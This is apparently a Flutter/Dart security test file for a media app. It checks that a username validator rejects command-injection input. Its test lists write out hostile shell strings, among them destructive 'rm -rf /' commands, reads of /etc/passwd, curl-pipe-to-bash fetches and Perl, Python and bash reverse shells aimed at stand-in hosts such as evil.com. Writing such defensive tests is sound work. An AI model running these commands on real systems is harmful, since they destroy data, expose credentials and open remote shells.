/// test/security/command_injection_test.dart
/// 
/// Tests for command injection attack prevention
import 'package:flutter_test/flutter_test.dart';
import 'package:freak_flix/utils/input_validation.dart';
import '../helpers/security_test_helpers.dart';

void main() {
  group('Command Injection Protection Tests', () {
    group('Basic Command Injection', () {
      test('blocks semicolon injection', () {
        final semicolonAttacks = [
          'user; rm -rf /',
          'username; cat /etc/passwd',
          'name; shutdown /s',
          'input; format c:',
          'filename; wget http://evil.com/malware',
        ];
        
        for (final attack in semicolonAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Semicolon injection should be blocked: $attack',
          );
        }
      });

      test('blocks logical operator injection', () {
        final logicalOperatorAttacks = [
          'user && cat /etc/passwd',
          'name && format c:',
          'input && ping -c 10 evil.com',
          'filename && malware.exe',
        ];
        
        for (final attack in logicalOperatorAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Logical operator injection should be blocked: $attack',
          );
        }
      });

      test('blocks pipe injection', () {
        final pipeAttacks = [
          'user| nc attacker.com 4444',
          'name| curl http://evil.com/payload.sh',
          'input| xterm',
          'filename| powershell -Command "Invoke-Expression"',
        ];
        
        for (final attack in pipeAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Pipe injection should be blocked: $attack',
          );
        }
      });

      test('blocks backtick injection', () {
        final backtickAttacks = [
          'user`whoami`',
          'name`cat /etc/passwd`',
          'input`hostname`',
          'filename`ls -la`',
        ];
        
        for (final attack in backtickAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Backtick injection should be blocked: $attack',
          );
        }
      });
    });

    group('Bypass Technique Protection', () {
      test('blocks newline injection', () {
        final newlineAttacks = [
          'user\ncat /etc/passwd',
          'name\nrm -rf /',
          'input\ncurl http://evil.com',
          'filename\nmalware.exe',
        ];
        
        for (final attack in newlineAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Newline injection should be blocked: $attack',
          );
        }
      });

      test('blocks tab injection', () {
        final tabAttacks = [
          'user\tcat /etc/passwd',
          'name\tformat c:',
          'input\twget http://evil.com/malware',
          'filename\tpowershell -Command "calc"',
        ];
        
        for (final attack in tabAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Tab injection should be blocked: $attack',
          );
        }
      });

      test('blocks variable expansion injection', () {
        final variableAttacks = [
          'user\$(cat /etc/passwd)',
          'name\$(whoami)',
          'input\$(hostname)',
          'filename\$(ls -la)',
          'user\${PATH}/malware',
          'name\${USER}/evil',
        ];
        
        for (final attack in variableAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Variable expansion injection should be blocked: $attack',
          );
        }
      });

      test('blocks IFS variable manipulation', () {
        final ifsAttacks = [
          'user\${IFS}cat\${IFS}/etc/passwd',
          'name\${IFS}rm\${IFS}-rf\${IFS}/',
          'input\${IFS}curl\${IFS}http://evil.com',
          'filename\${IFS}powershell\${IFS}-Command',
        ];
        
        for (final attack in ifsAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'IFS manipulation should be blocked: $attack',
          );
        }
      });
    });

    group('PowerShell-Specific Injection Protection', () {
      test('blocks PowerShell command separators', () {
        final powerShellAttacks = [
          'user; Start-Process cmd',
          'name| iwr -Uri http://evil.com',
          'input`Write-Host "pwned"`',
          'filename; Invoke-Expression "calc.exe"',
          'admin; Add-Type',
        ];
        
        for (final attack in powerShellAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'PowerShell injection should be blocked: $attack',
          );
        }
      });

      test('blocks PowerShell-specific commands', () {
        final powerShellCommands = [
          'user; Invoke-WebRequest',
          'name; Start-BitsTransfer',
          'input| Out-File',
          'filename; Register-ObjectEvent',
          'user; Set-Content',
        ];
        
        for (final attack in powerShellCommands) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'PowerShell command should be blocked: $attack',
          );
        }
      });
    });

    group('Encoded Command Injection Protection', () {
      test('blocks URL encoded command injection', () {
        final urlEncodedAttacks = [
          'user%3brm%20-rf%20%2f', // URL encoded ; rm -rf /
          'name%26%26cat%20%2fetc%2fpasswd', // URL encoded && cat /etc/passwd
          'input%7ccurl%20http%3a%2f%2fevil.com', // URL encoded | curl http://evil.com
          'filename%60whoami%60', // URL encoded `whoami`
        ];
        
        for (final attack in urlEncodedAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'URL encoded injection should be blocked: $attack',
          );
        }
      });

      test('blocks HTML encoded command injection', () {
        final htmlEncodedAttacks = [
          'user&amp;cat%20/etc/passwd',
          'name&amp;&amp;rm%20-rf%20/',
          'input&amp;wget%20http://evil.com',
          'filename&amp;ls%20-la',
        ];
        
        for (final attack in htmlEncodedAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'HTML encoded injection should be blocked: $attack',
          );
        }
      });
    });

    group('Time-Based Injection Protection', () {
      test('blocks time-based blind injection', () {
        final timeAttacks = [
          'user; sleep 10',
          'name| ping -c 10 127.0.0.1',
          'input&&timeout 10',
          'filename`sleep 5`',
        ];
        
        for (final attack in timeAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Time-based injection should be blocked: $attack',
          );
        }
      });

      test('blocks network-based time delays', () {
        final networkTimeAttacks = [
          'user; ping -c 5 google.com',
          'name| nslookup evil.com',
          'input&&dig @8.8.8.8 evil.com',
          'filename`traceroute attacker.com`',
        ];
        
        for (final attack in networkTimeAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Network time attack should be blocked: $attack',
          );
        }
      });
    });

    group('Advanced Injection Techniques', () {
      test('blocks nested command injection', () {
        final nestedAttacks = [
          'user; `cat /etc/passwd`',
          'name| $(whoami)',
          'input&& `curl http://evil.com`',
          'filename; $(ls -la)',
        ];
        
        for (final attack in nestedAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Nested injection should be blocked: $attack',
          );
        }
      });

      test('blocks command chaining with different operators', () {
        final chainingAttacks = [
          'user; cat /etc/passwd && rm -rf /',
          'name| whoami || wget http://evil.com',
          'input`hostname`; ping -c 3 google.com',
          'filename$(ls -la)| grep secret',
        ];
        
        for (final attack in chainingAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Command chaining should be blocked: $attack',
          );
        }
      });
    });

    group('File Execution Attacks', () {
      test('blocks script execution attempts', () {
        final scriptAttacks = [
          'user; ./malicious.sh',
          'name| /bin/bash -i',
          'input&& python3 evil.py',
          'filename`perl backdoor.pl`',
        ];
        
        for (final attack in scriptAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Script execution should be blocked: $attack',
          );
        }
      });

      test('blocks binary execution attempts', () {
        final binaryAttacks = [
          'user; /bin/sh',
          'name| nc -l -p 4444',
          'input&& /usr/bin/python3 -m http.server',
          'filename`socat TCP-LISTEN:4444 EXEC:sh`',
        ];
        
        for (final attack in binaryAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Binary execution should be blocked: $attack',
          );
        }
      });
    });

    group('Network-Based Injection Protection', () {
      test('blocks network command injection', () {
        final networkAttacks = [
          'user| nc attacker.com 4444',
          'name| wget http://evil.com/shell.sh',
          'input&& curl -s http://evil.com/payload | bash',
          'filename`python -c "import socket; subprocess.run(['bash', '-i'])"`',
        ];
        
        for (final attack in networkAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Network injection should be blocked: $attack',
          );
        }
      });

      test('blocks reverse shell attempts', () {
        final reverseShellAttacks = [
          'user| bash -i >& /dev/tcp/evil.com/4444 0>&1',
          'name&& nc -e /bin/sh attacker.com 4444',
          'input`perl -e "use Socket; \$p=fork; exit if(\$p); socket(S,2,1,6); connect(S,sockaddr_in(4444,inet_aton(\"evil.com\")); open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");"`',
          'filename; python -c "import os,socket,subprocess;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"',
        ];
        
        for (final attack in reverseShellAttacks) {
          SecurityTestHelpers.expectSecurityBlocked(
            attack,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Reverse shell should be blocked: $attack',
          );
        }
      });
    });

    group('Comprehensive Command Injection Test Cases', () {
      test('covers all identified injection techniques', () {
        final testCases = SecurityTestHelpers.generateCommandInjectionTestCases();
        
        for (final testCase in testCases) {
          SecurityTestHelpers.expectSecurityBlocked(
            testCase,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Command injection technique should be blocked: $testCase',
          );
        }
      });
    });

    group('Legitimate User Input', () {
      test('allows legitimate usernames', () {
        final legitimateUsernames = [
          'john',
          'user123',
          'admin_user',
          'test-user',
          'Alice',
          'Bob_Smith',
          'player_one',
          'mediafan',
          'content_creator',
        ];
        
        for (final username in legitimateUsernames) {
          SecurityTestHelpers.expectSecurityAllowed(
            username,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Legitimate username should be allowed: $username',
          );
        }
      });

      test('allows usernames with special characters', () {
        final allowedSpecialChars = [
          'user_name',
          'player-1',
          'user.name',
          'user_name_123',
          'test-user-name',
        ];
        
        for (final username in allowedSpecialChars) {
          SecurityTestHelpers.expectSecurityAllowed(
            username,
            (input) => InputValidation.validateUsername(input),
            customMessage: 'Username with allowed chars should be allowed: $username',
          );
        }
      });
    });
  });
}